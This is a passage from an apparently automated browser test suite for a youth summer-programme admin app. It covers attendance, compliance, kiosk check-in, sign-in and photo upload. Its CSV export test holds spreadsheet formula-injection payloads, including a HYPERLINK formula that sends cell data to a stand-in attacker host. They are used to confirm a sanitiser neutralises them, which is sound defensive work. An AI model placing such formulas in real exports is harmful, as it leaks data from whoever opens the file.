    await vp.waitForTimeout(300);
    const vEg = await vp.evaluate(() => document.body.innerText);
    ok('…and picking a centre narrows to that centre',
      /Tunde Bakare/.test(vEg) && /Segun Adeyemi/.test(vEg) && !/Ngozi Eze/.test(vEg) && !/Old Record/.test(vEg));
    /* An empty result has to read as "your filter matched nothing", not as
       "you have no volunteers" — the second sends somebody to go and add them
       all over again. */
    await vp.fill('input[placeholder="Search name, ID, email, role…"]', 'zzzz');
    await vp.waitForTimeout(300);
    ok('…with an empty result that blames the filter, not the data',
      /No volunteer matches that filter/.test(await vp.evaluate(() => document.body.innerText)));
    await vp.close();

    /* ── The three doors ─────────────────────────────────────────────────────
     * Reported as "where's the form for the online registration?" — and the
     * honest answer was nowhere. The backend has supported a public sign-up
     * link and a separately-passworded review desk since self-registration
     * shipped; this panel only ever created the staff desk, and copied every
     * link as /gate regardless of what it actually was.
     */
    const gk = await browser.newPage();
    const gkErrs = [];
    gk.on('pageerror', e => gkErrs.push(String(e.message)));
    await gk.goto(BASE + '/tests/_boards_fixture.html?board=gates&mode=ok', { waitUntil: 'networkidle' });
    await gk.waitForTimeout(700);
    ok('the gate-links panel mounts with no script error', gkErrs.length === 0);
    if (gkErrs.length) console.error('       ', gkErrs.slice(0, 2).join(' | '));

    const gkText = () => gk.evaluate(() => document.body.innerText);
    ok('you can make a public sign-up link, not just a staff desk',
      (await gk.getByRole('radio', { name: 'Public sign-up' }).count()) === 1
      && (await gk.getByRole('radio', { name: 'Review desk' }).count()) === 1);
    /* Three links that look identical in a table is how a public URL gets
       sent to a parents' group believing it is the staff desk. */
    /* Read off the TABLE, not the page — the three words are also the labels
       on the radio buttons above it, so a page-wide regex passes with the
       column deleted. */
    const gkRows = await gk.evaluate(() => Array.from(document.querySelectorAll('.admin-table tbody tr')).map(tr => ({
      text: tr.innerText.replace(/\s+/g, ' '),
      kind: (tr.querySelector('td:nth-child(2) .chip') || {}).textContent || '',
      href: (tr.querySelector('a[href]') || {}).getAttribute ? tr.querySelector('a[href]').getAttribute('href') : '',
    })));
    ok('…and the table says which door each existing link is',
      gkRows.length === 3 && gkRows.map(r => r.kind).join('|') === 'Staff desk|Public sign-up|Review desk');
    /* The href is what Copy link and Open both build. Asserting the printed
       path only would pass while the button still handed out /gate for
       everything — which is exactly what it used to do. */
    ok('…and every link points at its own door, not all at the staff desk',
      /\/apply\?g=GL-SELF$/.test(gkRows[1].href) && /\/review\?g=GL-REV$/.test(gkRows[2].href)
      && /\/gate\?g=GL-DESK$/.test(gkRows[0].href));

    /* A public link with a password is a staff desk somebody shared. The
       server drops the password; the panel must not offer the control and
       imply otherwise. */
    await gk.getByRole('radio', { name: 'Public sign-up' }).click();
    await gk.waitForTimeout(250);
    ok('a public link is not offered a password at all',
      (await gk.locator('input[placeholder="Desk password"]').count()) === 0
      && !/Generate password/.test(await gkText()));
    ok('…and says plainly what it is for',
      /link you send to families/i.test(await gkText()));
    await gk.getByRole('button', { name: /Create public sign-up/ }).click();
    await gk.waitForTimeout(400);
    ok('…and creating one asks the server for a self link with no password',
      await gk.evaluate(() => {
        const c = (window.__gateCreates || [])[0];
        return !!c && c.opts.kind === 'self' && !c.pw && c.opts.generate === false;
      }));

    /* The opposite rule: a review desk without a password lets anybody wave
       strangers into the programme. */
    await gk.getByRole('radio', { name: 'Review desk' }).click();
    await gk.waitForTimeout(250);
    ok('a review desk gets its own password back',
      /Generate password/.test(await gkText()) && /own password/i.test(await gkText()));
    await gk.close();

    /* ── Programme & policy: the screen that decides which days count ─────
       Mounted against a term where TODAY is cancelled, because that is the
       state the calendar exists to handle and the one the banner has to say
       out loud — before this, a closed day marked the whole cohort absent. */
    const pol = await browser.newPage();
    const polErrs = [];
    pol.on('console', m => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) polErrs.push(m.text()); });
    pol.on('pageerror', e => polErrs.push(String(e.message)));
    await pol.goto(BASE + '/tests/_boards_fixture.html?board=policy&mode=ok', { waitUntil: 'networkidle' });
    await pol.waitForTimeout(700);
    const polMountErrs = await pol.evaluate(() => window.__errors);
    ok('programme & policy mounts with no script error', polErrs.length === 0 && polMountErrs.length === 0);
    if (polErrs.length || polMountErrs.length) console.error('       ', polErrs.concat(polMountErrs).slice(0, 3).join(' | '));
    const polBody = await pol.evaluate(() => document.body.innerText);
    ok('…and says today is not a programme day, with the next session',
      /not a programme day/i.test(polBody) && /2026-07-20/.test(polBody));
    ok('…offers the term window and the weekday picker',
      await pol.locator('input[type=date]').count() >= 2
      // Scope to the summer-programme picker: the page now also carries a member-
      // programme picker, so an unscoped "Mon" matches two buttons.
      && await pol.getByRole('group', { name: 'Summer programme days' }).getByRole('button', { name: 'Mon', exact: true }).count() === 1);
    const dowOn = await pol.evaluate(() => {
      const g = document.querySelector('[role="group"][aria-label="Summer programme days"]');
      return g ? Array.from(g.querySelectorAll('[aria-pressed="true"]')).map(b => b.textContent.trim()) : [];
    });
    ok('…shows Mon–Fri selected and the weekend off (' + dowOn.join(',') + ')',
      dowOn.join(',') === 'Mon,Tue,Wed,Thu,Fri');
    ok('…lists the cancelled and added dates', /2026-07-15/.test(polBody) && /2026-07-11/.test(polBody));
    ok('…renders the compliance board worst-state first',
      polBody.indexOf('Evicted Person') < polBody.indexOf('Suspended Person')
      && polBody.indexOf('Suspended Person') < polBody.indexOf('Warned Person'));
    ok('…totals the outstanding fines in naira', /₦15,000/.test(polBody));
    ok('…names the Part VI redlines for both member types',
      (await pol.locator('input[type=time]').count()) >= 2 && /Redline 08:30/.test(polBody) && /Redline 09:00/.test(polBody));

    // Turning a weekday off has to reach the save payload, not just the chip.
    await pol.getByRole('group', { name: 'Summer programme days' }).getByRole('button', { name: 'Fri', exact: true }).click();
    await pol.getByRole('button', { name: /Save programme/ }).click();
    await pol.waitForTimeout(200);
    const saved = await pol.evaluate(() => window.__saved);
    ok('turning a weekday off is what gets saved',
      saved.length === 1 && saved[0].programme.weekdays.join(',') === '1,2,3,4');

    // The record drawer is where a wrongly logged absence gets corrected.
    await pol.getByRole('button', { name: 'Record' }).first().click();
    await pol.waitForTimeout(300);
    const drawer = await pol.evaluate(() => {
      const el = document.querySelector('.admin-drawer-panel');
      return el ? el.innerText : '';
    });
    ok('the compliance record opens with the ledger and the sanctions',
      /Absence 2 of 2/.test(drawer) && /2026-07-07/.test(drawer) && /₦5,000/.test(drawer));
    ok('…marks an already-voided fact as voided rather than hiding it', /Voided — Wrong student/.test(drawer));
    ok('…offers the manual ID-card infractions', /No ID card today/.test(drawer) && /Lost ID card/.test(drawer));
    await pol.close();

    /* ── Attendance dashboard ─────────────────────────────────────────────
       The screen a coordinator reads every morning. It had no idea whether the
       programme was even running, so a weekend looked like a collapse and the
       guardian-email button was live on a Sunday. */
    const att = await browser.newPage();
    const attErrs = [];
    att.on('console', m => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) attErrs.push(m.text()); });
    att.on('pageerror', e => attErrs.push(String(e.message)));
    await att.goto(BASE + '/tests/_boards_fixture.html?board=att&mode=ok', { waitUntil: 'networkidle' });
    await att.waitForTimeout(600);
    ok('attendance dashboard mounts with no script error', attErrs.length === 0 && (await att.evaluate(() => window.__errors)).length === 0);
    if (attErrs.length) console.error('       ', attErrs.slice(0, 3).join(' | '));
    let attBody = await att.evaluate(() => document.body.innerText);
    ok('…names the session day and the term window', /Session day 10/.test(attBody) && /2026-07-06/.test(attBody));
    ok('…marks the closed days in the 14-day series rather than drawing them as zero',
      await att.locator('.summer-attbar-col.is-closed').count() === 4);
    ok('…shows lateness and half-days per student', /·2½/.test(attBody) && /Dormant/.test(attBody));

    // Filters have to actually narrow the table, and hold across a search.
    const rows = () => att.locator('.admin-table tbody tr').count();
    const chip = (label) => att.locator('.att-chip', { hasText: label }).first();
    ok('…lists the whole roster by default (' + await rows() + ')', await rows() === 4);

    /* THE SCENARIOS. These were one unlabelled dropdown, so the only way to
       learn whether a filter held anybody was to choose it — and on a capped
       list the answer could be a misleading "none". Each is now a chip
       carrying its own count, and "never attended" exists at all: a child with
       no check-in was hidden inside "under 50%" with everyone merely
       struggling. */
    ok('…offers the situations a coordinator walks in with, each with its count',
      await att.locator('.att-chip').count() === 10
      && /Stopped coming/.test(attBody) && /Never attended/.test(attBody)
      && /Half days/.test(attBody) && /Every day/.test(attBody));
    ok('…and the counts come from the whole register, not the drawn page',
      (await chip('Absent today').innerText()).indexOf('2') !== -1
      && (await chip('Late arrivals').innerText()).indexOf('2') !== -1);
    /* A filter with nothing in it is disabled rather than offered — choosing it
       could only ever produce an empty table, which reads as a broken screen. */
    ok('…a situation with nobody in it is disabled, not offered',
      await chip('Never attended').isDisabled() && !(await chip('Absent today').isDisabled()));

    /* ── Reading it ───────────────────────────────────────────────────────
       "Present" and "Rate" against an unstated span is what made this table
       hard to read: 62% of the term and 62% of last week look identical. */
    ok('the rate column says what it is a rate OF, and the days column its total',
      /of 10 open/.test(attBody) && /this term/.test(attBody));
    // 0 of 10 and 3 of 10 read the same at a glance, and are different problems.
    const zeroCell = await att.evaluate(() => {
      const tr = Array.from(document.querySelectorAll('.att-table tbody tr'))
        .find(r => /Bode Beta/.test(r.innerText));
      return tr ? { risk: tr.getAttribute('data-risk'), text: tr.innerText } : null;
    });
    ok('…and a child at risk is visible while scanning, not only once read',
      zeroCell && zeroCell.risk === '1');

    /* THE CASE A RATE CANNOT EXPRESS. Bode Beta came every day and stopped;
       Dupe Dara comes three days a week, every week. Both are on 30%, and they
       need opposite responses — a phone call home versus a timetable
       conversation. The register showed one number for both. */
    const sameRate = await att.evaluate(() => {
      const pick = (name) => {
        const tr = Array.from(document.querySelectorAll('.att-table tbody tr')).find(r => new RegExp(name).test(r.innerText));
        if (!tr) return null;
        return {
          text: tr.innerText.replace(/\s+/g, ' '),
          days: Array.from(tr.querySelectorAll('.att-pat i')).map(i => i.getAttribute('data-d')).join(''),
        };
      };
      return { bode: pick('Bode Beta'), dupe: pick('Dupe Dara') };
    });
    ok('two children on the same rate are told apart by their pattern',
      sameRate.bode && sameRate.dupe
      && /30%/.test(sameRate.bode.text) && /30%/.test(sameRate.dupe.text)
      && sameRate.bode.days !== sameRate.dupe.days
      && /outoutoutoutoutout$/.test(sameRate.bode.days)
      && /in$/.test(sameRate.dupe.days));
    ok('…and the one who stopped says so in words, with no date arithmetic',
      /missed the last 6 days/.test(sameRate.bode.text)
      && !/missed the last/.test(sameRate.dupe.text));

    await chip('Stopped coming').click();
    await att.waitForTimeout(600);
    ok('…and "stopped coming" is its own situation, not a slice of "under 50%"',
      await rows() === 1
      && /Bode Beta/.test(await att.evaluate(() => document.body.innerText))
      && (await att.evaluate(() => (window.__attOpts || {}).scenario)) === 'stopped');
    await chip('Everyone').click();
    await att.waitForTimeout(600);

    await chip('Absent today').click();
    await att.waitForTimeout(600);
    ok('…filters to absent-today', await rows() === 2);
    /* The search is debounced and then SENT to the server, so these waits have
       to clear the debounce plus the round trip — a 140ms wait passed only while
       the filtering happened locally, which is the bug. */
    await att.fill('input[aria-label="Search the register"]', 'bode');
    await att.waitForTimeout(600);
    ok('…and a search narrows inside the filter, rather than replacing it', await rows() === 1);
    ok('…and the search reaches the server rather than sifting the drawn page',
      (await att.evaluate(() => (window.__attOpts || {}).q)) === 'bode');
    await att.fill('input[aria-label="Search the register"]', 'zzz');
    await att.waitForTimeout(600);
    ok('…says so when nothing matches', /No child matches/.test(await att.evaluate(() => document.body.innerText)));
    await att.fill('input[aria-label="Search the register"]', '');
    await chip('Everyone').click();
    await att.waitForTimeout(600);

    /* ── The volunteers ──────────────────────────────────────────────────
       Their check-ins have been in the same table since the scanner learned to
       read a badge. Every query on this screen joins summer_students so that
       they cannot skew the children's rate — and the effect was that the people
       running the centre appeared nowhere on the one screen about who turned
       up. */
    await att.locator('.att-seg-btn', { hasText: 'Volunteers' }).click();
    await att.waitForTimeout(200);
    const volBody = await att.evaluate(() => document.body.innerText);
    ok('…has a volunteers register at all, with names on it',
      /ATTENDANCE BY VOLUNTEER/.test(volBody) && /Mentor Mary/.test(volBody) && /Absent Ada/.test(volBody));
    ok('…and shows each volunteer\'s rate, punctuality and streak',
      /73%/.test(volBody) && /88%/.test(volBody) && await rows() === 3);
    /* A volunteer who joined in week three did not miss weeks one and two. The
       denominator is programme days since THEY joined, so 5 of 5 is 100% and
       must not read as 5 of 10. */
    ok('…counting each volunteer only from the day they joined',
      /5\/5/.test(volBody) && /from 2026-07-20/.test(volBody));
    ok('…and repeats the caveat that there is no rota to net a part-timer out',
      /no rota in the system/.test(volBody));
    await chip('Never attended').click();
    await att.waitForTimeout(140);
    ok('…the scenarios filter the volunteer register with the same meaning',
      await rows() === 1 && /Absent Ada/.test(await att.evaluate(() => document.body.innerText)));
    await chip('Everyone').click();
    await att.waitForTimeout(140);

    /* ── Dates ───────────────────────────────────────────────────────────
       There was no way to ask about anything but term-to-date, and no statement
       of which span the rate column was out of. */
    ok('…states the window the rate is measured over, not just a day count',
      /term to date/.test(await att.evaluate(() => document.body.innerText)));
    await att.fill('input[aria-label="From date"]', '2026-07-13');
    await att.fill('input[aria-label="To date"]', '2026-07-17');
    await att.waitForTimeout(300);
    ok('…and a chosen range is sent to the server rather than filtered in the page',
      JSON.stringify(await att.evaluate(() => window.__volOpts)) === '{"from":"2026-07-13","to":"2026-07-17"}');

    /* ── One day, by name ────────────────────────────────────────────────
       The chart could say a day was thin and nothing else. "Which children"
       was only answerable by exporting the register and reading dates by eye. */
    /* Bail out cleanly rather than letting a 30s click timeout abort the
       hundreds of assertions after this block — a regression here should read
       as failed checks, not as a broken harness. */
    const bar = att.locator('.summer-attbar-col').nth(3);
    const barLive = await bar.isEnabled().catch(() => false);
    ok('…the day bars are reachable at all', barLive);
    let dayTxt = "";
    if (barLive) {
      await bar.click();
      await att.waitForSelector('.att-day', { timeout: 8000 }).catch(() => {});
      dayTxt = await att.evaluate(() => { const n = document.querySelector('.att-day'); return n ? n.innerText : ""; });
    }
    ok('…a day opens from its bar and names who was NOT in, by default',
      /Bode Beta/.test(dayTxt) && /Absent Ada/.test(dayTxt)
      && dayTxt.indexOf('Amina Alpha') === -1);
    ok('…splitting children from volunteers rather than one undifferentiated list',
      /CHILDREN · 1/.test(dayTxt) && /VOLUNTEERS · 1/.test(dayTxt));
    ok('…and asks the server for that exact date',
      (await att.evaluate(() => (window.__dayAsked || {}).date)) === '2026-07-09');
    let inTxt = "";
    if (dayTxt) {
      await att.locator('.att-day .att-seg-btn', { hasText: 'Checked in' }).click();
      await att.waitForTimeout(150);
      inTxt = await att.evaluate(() => { const n = document.querySelector('.att-day'); return n ? n.innerText : ""; });
    }
    ok('…the other side lists who came, with the time and the lateness',
      /Amina Alpha/.test(inTxt) && /08:12/.test(inTxt) && /late 24m/.test(inTxt) && /arrived late/.test(inTxt));
    ok('…and marks the half day rather than counting it as a full one', /½/.test(inTxt));
    await att.close();

    // Closed day: the numbers and the guardian email both have to stand down.
    const attC = await browser.newPage();
    await attC.goto(BASE + '/tests/_boards_fixture.html?board=att&mode=ok&closed=1', { waitUntil: 'networkidle' });
    await attC.waitForTimeout(600);
    attBody = await attC.evaluate(() => document.body.innerText);
    ok('on a closed day the banner says there is no session, and names the next one',
      /No session today/.test(attBody) && /2026-07-20/.test(attBody));
    ok('…the absent tile stands down rather than reporting the whole cohort', /Absent \(closed\)/.test(attBody));
    ok('…and the guardian-email button is disabled',
      await attC.getByRole('button', { name: /Email today/ }).isDisabled());
    await attC.close();

    // No calendar at all: say so, because every day is silently a session.
    const attN = await browser.newPage();
    await attN.goto(BASE + '/tests/_boards_fixture.html?board=att&mode=ok&nocal=1', { waitUntil: 'networkidle' });
    await attN.waitForTimeout(600);
    ok('with no calendar set the dashboard warns that every day counts',
      /every calendar day counts as a session/i.test(await attN.evaluate(() => document.body.innerText)));
    await attN.close();

    /* ── Check-in kiosk ───────────────────────────────────────────────────
       Punctuality was recorded but never shown, so the desk had no idea a scan
       had just cost someone a lateness log — and a policy refusal printed its
       raw error code. */
    const kio = await browser.newPage();
    const kioErrs = [];
    kio.on('console', m => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) kioErrs.push(m.text()); });
    kio.on('pageerror', e => kioErrs.push(String(e.message)));
    await kio.goto(BASE + '/tests/_boards_fixture.html?board=kiosk&mode=ok', { waitUntil: 'networkidle' });
    await kio.waitForTimeout(400);
    ok('kiosk mounts with no script error', kioErrs.length === 0 && (await kio.evaluate(() => window.__errors)).length === 0);
    if (kioErrs.length) console.error('       ', kioErrs.slice(0, 3).join(' | '));
    await kio.fill('.summer-scan-input', 'SUMQR-AAAA1111');
    await kio.getByRole('button', { name: /Check in/ }).click();
    await kio.waitForTimeout(300);
    let kioBody = await kio.evaluate(() => document.querySelector('.summer-kiosk-result').innerText);
    ok('a late scan says LATE, with the minutes', /LATE/.test(kioBody) && /42 min/.test(kioBody));
    ok('…and flags the missed Musing Period as a half-day', /Half-day/.test(kioBody));
    ok('…and surfaces the standing the scan just landed on', /Warned/.test(kioBody));
    await kio.fill('.summer-scan-input', 'REFUSED');
    await kio.getByRole('button', { name: /Check in/ }).click();
    await kio.waitForTimeout(300);
    kioBody = await kio.evaluate(() => document.querySelector('.summer-kiosk-result').innerText);
    ok('a refused scan names the person and the reason, not an error code',
      /Suspended Sam/.test(kioBody) && /barred from the premises/.test(kioBody) && !/policy_suspended/.test(kioBody));
    ok('…and says plainly that they are not checked in', /Not checked in/.test(kioBody));
    await kio.close();

    /* ── Community sign-in ────────────────────────────────────────────────
       Instructors hold the same ID card as students but their card carries
       their OWN number, not a guardian's — which is why the guardian-phone
       check could never match one. The door now asks who is holding it. */
    const si = await browser.newPage();
    const siErrs = [];
    si.on('console', m => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) siErrs.push(m.text()); });
    si.on('pageerror', e => siErrs.push(String(e.message)));
    await si.goto(BASE + '/tests/_boards_fixture.html?board=signin&mode=ok', { waitUntil: 'networkidle' });
    await si.waitForTimeout(400);
    ok('community sign-in mounts with no script error', siErrs.length === 0 && (await si.evaluate(() => window.__errors)).length === 0);
    if (siErrs.length) console.error('       ', siErrs.slice(0, 3).join(' | '));
    ok('…offers both doors', await si.getByRole('tab', { name: /student/i }).count() === 1
      && await si.getByRole('tab', { name: /volunteer/i }).count() === 1);
    ok('…asks a student for their guardian\'s number',
      (await si.getAttribute('input[aria-label="Guardian phone number"]', 'placeholder')) === 'Guardian phone');
    await si.getByRole('tab', { name: /volunteer/i }).click();
    await si.waitForTimeout(120);
    ok('…and an instructor for their own',
      (await si.getAttribute('input[aria-label="Your phone number"]', 'placeholder')) === 'Your phone');
    ok('…prompting for the card ID, not a student ID',
      /VOL-INS/.test(await si.getAttribute('input[aria-label="Card ID"]', 'placeholder')));
    await si.fill('input[aria-label="Card ID"]', 'VOL-INS-26-001');
    await si.fill('input[aria-label="Your phone number"]', '08037654321');
    await si.getByRole('button', { name: /Enter/ }).click();
    await si.waitForTimeout(200);
    const logins = await si.evaluate(() => window.__logins);
    ok('…and sends the instructor\'s ID and phone to the login',
      logins.length === 1 && logins[0].displayId === 'VOL-INS-26-001' && /8037654321/.test(logins[0].guardianPhone));
    await si.close();

    /* ── Summer registration: the photo step ──────────────────────────────
       Run against Chromium's fake camera, because the failure is invisible to
       any test that does not actually open a stream: the overlay rendered the
       <video> only once camState was 'live', but the stream was attached to
       videoRef *before* that flag flipped — so the ref was null, the assignment
       was skipped, and the element then mounted with nothing in it. A camera
       that is permanently blank. */
    const camCtx = await browser.newContext({ permissions: ['camera'] });
    const gp = await camCtx.newPage();
    const gpErrs = [];
    gp.on('console', m => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) gpErrs.push(m.text()); });
    gp.on('pageerror', e => gpErrs.push(String(e.message)));
    await gp.goto(BASE + '/tests/_boards_fixture.html?board=gatephoto&mode=ok', { waitUntil: 'networkidle' });
    await gp.waitForTimeout(300);
    ok('registration photo step mounts with no script error', gpErrs.length === 0 && (await gp.evaluate(() => window.__errors)).length === 0);
    if (gpErrs.length) console.error('       ', gpErrs.slice(0, 3).join(' | '));

    await gp.getByRole('button', { name: /Open camera/ }).first().click();
    await gp.waitForTimeout(1500);
    const cam = await gp.evaluate(() => {
      const v = document.querySelector('[role="dialog"] video');
      return v ? { mounted: true, hasStream: !!v.srcObject,
                   live: !!(v.srcObject && v.srcObject.getVideoTracks().length && v.srcObject.getVideoTracks()[0].readyState === 'live'),
                   w: v.videoWidth, playing: !v.paused } : { mounted: false };
    });
    ok('the camera overlay actually shows a live stream, not a blank frame',
      cam.mounted && cam.hasStream && cam.live && cam.w > 0 && cam.playing);
    if (cam.mounted && !cam.hasStream) console.error('        video mounted with no srcObject — the stream was never attached');
    ok('…and the shutter is enabled once it is live',
      !(await gp.getByRole('button', { name: 'Take photo' }).isDisabled()));

    // The camera being blocked must not be a dead end: a real file picker, with
    // the gallery available. capture="user" forces the camera on mobile and
    // removes "choose an existing photo" entirely, which is what "does not
    // allow upload" was.
    const picker = await gp.evaluate(() => {
      const i = document.querySelector('input[type=file]');
      return i ? { accept: i.getAttribute('accept'), capture: i.getAttribute('capture') } : null;
    });
    ok('the file picker offers the gallery rather than forcing the camera',
      picker && picker.accept === 'image/*' && picker.capture === null);

    await gp.evaluate(() => {
      const i = document.querySelector('input[type=file]');
      const dt = new DataTransfer();
      const png = atob('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z/C/HgAGgwJ/lK3Q6wAAAABJRU5ErkJggg==');
      const bytes = new Uint8Array(png.length);
      for (let k = 0; k < png.length; k++) bytes[k] = png.charCodeAt(k);
      dt.items.add(new File([bytes], 'gallery.png', { type: 'image/png' }));
      i.files = dt.files;
      i.dispatchEvent(new Event('change', { bubbles: true }));
    });
    await gp.waitForTimeout(500);
    ok('…and a picked photo uploads and lands on the form',
      (await gp.evaluate(() => window.__uploaded)).length === 1
      && /cloudinary/.test(await gp.evaluate(() => window.__photo || '')));
    ok('…which also closes the camera overlay',
      await gp.locator('[role="dialog"]').count() === 0);

    /* And the same picker on a deployment with NO cloud configured. Cloudinary
       needs three keys in config.php, so this is the state every deployment is
       in until somebody sets them — and the desk used to answer "photo uploads
       aren't set up on this server yet, skip for now", which meant no child got
       a photograph and the review desk had nothing to look at. The image now
       travels in the submission and the server holds it. */
    const gpNo = await camCtx.newPage();
    await gpNo.goto(BASE + '/tests/_boards_fixture.html?board=gatephoto&mode=ok&uploads=off', { waitUntil: 'networkidle' });
    await gpNo.evaluate(() => {
      const i = document.querySelector('input[type=file]');
      const dt = new DataTransfer();
      dt.items.add(new File([new Uint8Array([137, 80, 78, 71])], 'nocloud.png', { type: 'image/png' }));
      i.files = dt.files;
      i.dispatchEvent(new Event('change', { bubbles: true }));
    });
    await gpNo.waitForTimeout(400);
    const noCloud = await gpNo.evaluate(() => ({ photo: window.__photo || '', body: document.body.innerText }));
    ok('with no cloud configured the photo still lands, carried inline',
      /^data:image\//.test(noCloud.photo));
    ok('…and the desk does not tell the operator to skip it',
      !/aren't set up|not set up|skip for now/i.test(noCloud.body));
    await gpNo.close();
    await camCtx.close();
    const camCtx2 = await browser.newContext({ permissions: ['camera'] });

    // The admin/apply PhotoCapture opens its camera a different way but had the
    // same hazard — srcObject assigned from the getUserMedia callback, against
    // a ref that only exists if the render already happened.
    const pc = await camCtx2.newPage();
    await pc.goto(BASE + '/tests/_boards_fixture.html?board=capture&mode=ok', { waitUntil: 'networkidle' });
    await pc.waitForTimeout(300);
    await pc.getByRole('button', { name: 'Take photo' }).click();
    await pc.waitForTimeout(1500);
    const pcCam = await pc.evaluate(() => {
      const v = document.querySelector('[role="dialog"] video');
      return v ? { hasStream: !!v.srcObject, w: v.videoWidth, playing: !v.paused } : null;
    });
    ok('the admin photo capture also shows a live stream', pcCam && pcCam.hasStream && pcCam.w > 0 && pcCam.playing);

    /* ── Why SOME photos were rejected in the public sign-up ───────────────
     * ImageTools.prepare skipped the re-encode on size alone, and every skip
     * handed back the ORIGINAL FILE. An iPhone on "High Efficiency" saves HEIC;
     * a small HEIC headshot was under both thresholds, so it skipped, went into
     * the submission as data:image/heic and the server's photo gate refused it
     * as `not_an_image`. Large photos were re-encoded on the way past and went
     * through fine — which is exactly why it only ever hit SOME photos.
     *
     * Modelled with real PNG bytes carrying a type the pipeline will not send.
     * That is the HEIC-on-Safari case precisely: decodable, small, and in a
     * format the server refuses. */
    const prep = await pc.evaluate(async () => {
      await new Promise((res, rej) => {
        const s = document.createElement('script');
        s.src = '/vendor/image-tools.js'; s.onload = res; s.onerror = rej;
        document.head.appendChild(s);
      });
      // A 600x600 PNG: comfortably under maxPx 1000 and under the 350KB floor.
      const c = document.createElement('canvas'); c.width = 600; c.height = 600;
      const g = c.getContext('2d');
      g.fillStyle = '#8d5524'; g.fillRect(0, 0, 600, 600);
      g.fillStyle = '#3b2a1e'; g.beginPath(); g.arc(300, 260, 120, 0, Math.PI * 2); g.fill();
      const png = await new Promise(r => c.toBlob(r, 'image/png'));
      const opts = { maxPx: 1000, quality: 0.78 };
      const asPng = await window.ImageTools.prepare(new File([png], 'p.png', { type: 'image/png' }), opts);
      const asHeic = await window.ImageTools.prepare(new File([png], 'p.heic', { type: 'image/heic' }), opts);
      // Bytes no browser can decode, in a format we cannot send: Chrome/Android
      // with a HEIC straight off an iPhone.
      const junk = new Uint8Array(9000); junk[0] = 1;
      const undec = await window.ImageTools.prepare(new File([junk], 'p.heic', { type: 'image/heic' }), opts);
      return {
        pngSkipped: asPng.skipped, pngType: asPng.type, pngBytes: png.size,
        heicSkipped: asHeic.skipped, heicType: asHeic.type, heicOk: asHeic.typeOk,
        undecReason: undec.reason, undecTypeOk: undec.typeOk,
        sendable: window.ImageTools.okTypes,
      };
    });
    // An already-web-sized JPEG/PNG still skips — re-encoding costs a generation.
    ok('a small photo in a sendable format is still passed through untouched',
      prep.pngSkipped === true && prep.pngBytes < 350 * 1024);
    // THE BUG.
    ok('a small photo in a format the server refuses is converted, not passed through',
      prep.heicSkipped === false && prep.heicType === 'image/jpeg' && prep.heicOk === true);
    ok('…and bytes the browser cannot decode are named as such, not sent blind',
      prep.undecReason === 'undecodable' && prep.undecTypeOk === false);
    ok('the sendable list matches the server photo gate (jpeg/png/webp)',
      JSON.stringify(prep.sendable.filter(t => t !== 'image/jpg')) === '["image/jpeg","image/png","image/webp"]');

    /* The advice half. api/_lib/domain/selfreg.php is explicit that only a human
     * may turn a family away — and then the browser blocked outright on a
     * luminance mean and on FaceDetector, both of which read darker skin in poor
     * light worst. A photo of a dark-skinned child in a dim room is the reading
     * this check is least able to make and was most willing to refuse. */
    const soft = await pc.evaluate(async () => {
      const mk = (fill, w, h) => {
        const c = document.createElement('canvas'); c.width = w; c.height = h;
        const g = c.getContext('2d'); g.fillStyle = fill; g.fillRect(0, 0, w, h);
        // A little structure so the blur check has an edge to find.
        g.fillStyle = 'rgba(255,255,255,0.10)';
        for (let i = 0; i < h; i += 7) g.fillRect(0, i, w, 3);
        return c;
      };
      const dark = await window.validateHeadshot(mk('#050505', 600, 750), 600, 750);
      const flat = await window.validateHeadshot(mk('#7a5a3a', 600, 750), 600, 750);
      const tiny = await window.validateHeadshot(mk('#7a5a3a', 200, 250), 200, 250);
      return { dark, flat, tiny, floor: window.HEADSHOT_MIN_PX,
               help: window.photoFormatHelp({ photoType: 'image/heic' }) };
    });
    ok('a very dark photo is advised on, not refused',
      soft.dark.ok === true && typeof soft.dark.warn === 'string' && soft.dark.warn.length > 0);
    ok('a normal photo passes with nothing to say', soft.flat.ok === true && !soft.flat.warn);
    // The one thing that genuinely cannot make a printed card still stops.
    ok('a photo too small for a printed ID is still refused, at the server\'s floor',
      soft.tiny.ok === false && soft.floor === 320 && /320 pixels/.test(soft.tiny.reason));
    ok('an unsendable format gets advice a family can act on, naming the format',
      /HEIC/.test(soft.help) && /Most Compatible|JPEG/.test(soft.help));
    /* CSV exports carry names and free text typed into PUBLIC forms. Excel,
       Sheets and LibreOffice all treat a cell beginning with =, +, - or @ as a
       formula, so an applicant who registers as `=HYPERLINK(...)` gets that run
       on the machine of whoever opens the export. Quoting alone does not stop
       it — the parser strips the quotes before deciding. */
    const csv = await pc.evaluate(() => ({
      formula:  window.nggCsvCell('=HYPERLINK("http://evil.example/"&A1,"Payroll")'),
      plus:     window.nggCsvCell('+1234'),
      minus:    window.nggCsvCell('-2+3'),
      at:       window.nggCsvCell('@SUM(A1:A9)'),
      tab:      window.nggCsvCell('\t=cmd'),
      ordinary: window.nggCsvCell('Temiloluwa Adeyemi'),
      comma:    window.nggCsvCell('Adeyemi, Temiloluwa'),
      quoted:   window.nggCsvCell('She said "hello"'),
      empty:    window.nggCsvCell(null),
      minusNum: window.nggCsvCell(-5),
    }));
    ok('a formula in an exported cell is neutralised, not just quoted',
      csv.formula.indexOf('"\'=HYPERLINK') === 0);
    ok('every leading formula character is caught, not only "="',
      csv.plus.indexOf('"\'+') === 0 && csv.minus.indexOf('"\'-') === 0 && csv.at.indexOf('"\'@') === 0);
    ok('a leading tab is caught too — spreadsheets skip it before deciding',
      csv.tab.indexOf('"\'\t') === 0);
    ok('an ordinary name is untouched apart from quoting', csv.ordinary === '"Temiloluwa Adeyemi"');
    ok('a comma stays inside one cell', csv.comma === '"Adeyemi, Temiloluwa"');
    ok('an embedded quote is doubled per RFC 4180', csv.quoted === '"She said ""hello"""');
    ok('an empty value is an empty cell, not the word null', csv.empty === '""');
    /* A negative NUMBER is escaped too. That is deliberate: the guard cannot
       tell -5 from -2+3, and a leading apostrophe on a number is a cosmetic
       cost, while a formula is an executable one. */
    ok('a negative number is escaped as well, erring toward safety', csv.minusNum === '"\'-5"');
    /* ── The composer must be usable on a phone ──────────────────────────
